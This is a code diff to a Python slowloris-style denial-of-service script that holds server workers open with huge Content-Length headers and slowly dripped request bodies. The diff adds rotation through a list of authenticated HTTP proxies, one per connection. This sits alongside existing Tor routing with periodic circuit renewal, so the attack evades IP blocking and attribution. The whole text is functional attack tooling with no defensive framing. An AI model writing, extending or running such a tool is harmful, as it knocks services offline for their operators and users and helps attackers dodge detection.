@@ -18,6 +18,8 @@ Usage:
 import socket, select, threading, time, argparse
 from datetime import datetime
 
+import itertools
+
 try:
     import socks as pysocks
     PYSOCKS_OK = True
@@ -73,9 +75,32 @@ def _is_dead(s):
         return True
 
 
-_tor_ctrl  = None
-_tor_lock  = threading.Lock()
-NEWNYM_EVERY = 50   # rotate Tor circuit after every N new connections
+_tor_ctrl    = None
+_tor_lock    = threading.Lock()
+NEWNYM_EVERY = 50
+
+_proxy_cycle = None   # itertools.cycle over [(ip,port,user,pwd), ...]
+_proxy_lock  = threading.Lock()
+
+
+def load_proxies(path):
+    """Parse ip:port:user:pass lines, return list of tuples."""
+    proxies = []
+    with open(path) as f:
+        for line in f:
+            line = line.strip()
+            if not line:
+                continue
+            parts = line.split(":")
+            if len(parts) == 4:
+                ip, port, user, pwd = parts
+                proxies.append((ip, int(port), user, pwd))
+    return proxies
+
+
+def _next_proxy():
+    with _proxy_lock:
+        return next(_proxy_cycle)
 
 
 def _init_tor():
@@ -99,19 +124,21 @@ def _newnym():
             pass
 
 
-def open_slowloris_socket(target, port, use_tor=False):
+def open_slowloris_socket(target, port, use_tor=False, use_proxies=False):
     """
-    Connect (via Tor SOCKS5 if use_tor), send complete headers with
-    Content-Length: 999999999, then drip 1 byte every DRIP_INTERVAL seconds.
-    Server allocates body buffer and pins a worker waiting for the rest.
-    Returns socket or None.
+    Connect via Tor SOCKS5, HTTP CONNECT proxy, or direct.
+    Sends complete headers with Content-Length: 999999999, drips body slowly.
     """
     try:
+        if not PYSOCKS_OK and (use_tor or use_proxies):
+            raise RuntimeError("pip3 install pysocks")
         if use_tor:
-            if not PYSOCKS_OK:
-                raise RuntimeError("PySocks not installed — pip3 install pysocks")
             s = pysocks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
             s.set_proxy(pysocks.SOCKS5, "127.0.0.1", 9050)
+        elif use_proxies:
+            ip, port_p, user, pwd = _next_proxy()
+            s = pysocks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
+            s.set_proxy(pysocks.HTTP, ip, port_p, username=user, password=pwd)
         else:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.settimeout(10)
@@ -141,11 +168,21 @@ def main():
     p.add_argument("--connections",    type=int, default=300)
     p.add_argument("--check-interval", type=float, default=6.0)
     p.add_argument("--tor",            action="store_true",
-                   help="Route connections through Tor SOCKS5 (127.0.0.1:9050)")
+                   help="Route via Tor SOCKS5 (127.0.0.1:9050)")
+    p.add_argument("--proxy-file",     default=None,
+                   help="ip:port:user:pass proxy list — each connection uses next proxy")
     args = p.parse_args()
 
+    global _proxy_cycle
     if args.tor:
         _init_tor()
+    if args.proxy_file:
+        proxies = load_proxies(args.proxy_file)
+        if not proxies:
+            print(f"  {R}[ERROR]{W} No proxies loaded from {args.proxy_file}")
+            return
+        _proxy_cycle = itertools.cycle(proxies)
+        print(f"  {G}[PROXY]{W} {len(proxies)} proxies loaded — rotating per connection")
 
     pool  = []
     lock  = threading.Lock()
@@ -157,7 +194,7 @@ def main():
 {B}{'='*62}{W}
   Target      : {args.target}:{args.port}
   Connections : {args.connections} (slow POST body, auto-refill dead)
-  Proxy       : {"Tor SOCKS5 127.0.0.1:9050 — NEWNYM every "+str(NEWNYM_EVERY)+" conns" if args.tor else "direct"}
+  Proxy       : {"Tor SOCKS5 — NEWNYM every "+str(NEWNYM_EVERY)+" conns" if args.tor else (args.proxy_file+" (rotating)" if args.proxy_file else "direct")}
   Proof       : probe_8080 + probe_80 fresh-connect each cycle
 {B}{'='*62}{W}
 """)
@@ -179,7 +216,9 @@ def main():
                 if args.tor and opened_total % NEWNYM_EVERY == 0 and opened_total > 0:
                     with _tor_lock:
                         _newnym()
-                s = open_slowloris_socket(args.target, args.port, use_tor=args.tor)
+                s = open_slowloris_socket(args.target, args.port,
+                                          use_tor=args.tor,
+                                          use_proxies=bool(args.proxy_file))
                 if s:
                     with lock:
                         pool.append(s)
